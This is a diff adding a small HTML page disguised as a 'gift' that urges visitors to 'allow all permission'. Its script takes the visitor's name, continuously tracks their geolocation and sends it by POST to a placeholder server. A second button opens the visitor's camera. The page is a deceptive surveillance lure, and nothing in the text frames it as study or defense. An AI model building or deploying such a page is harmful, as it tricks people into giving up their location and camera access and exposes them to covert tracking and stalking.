@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GIFT</title>
+</head>
+<body><h5>ALLOW ALL PERMISSION TO OPEN </h5>
+  <h2>GIFT FOR YOU</h2>
+  <input type="text" id="username" placeholder="Enter your name" />
+  <button onclick="startTracking()">🎁 Gift</button>
+<img id="photo" src="C:\Users\user\Downloads\gift.com/500" alt="Gift Image" />
+
+  <!-- Camera section -->
+  <h2>BIG Surprise</h2>
+  <button onclick="openCamera()">GIFT</button>
+  <br><br>
+  <video id="video" width="320" height="240" autoplay></video>
+
+  <script>
+    function startTracking() {
+      const name = document.getElementById("username").value;
+      if (!name) return alert("Please enter your name");
+
+      navigator.geolocation.watchPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        fetch('https://your-server.com/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, latitude: lat, longitude: lon })
+        });
+      });
+    }
+
+    function openCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+        })
+        .catch(error => {
+          alert("Camera access denied: " + error.message);
+        });
+    }
+  </script>
+</body>
+</html>
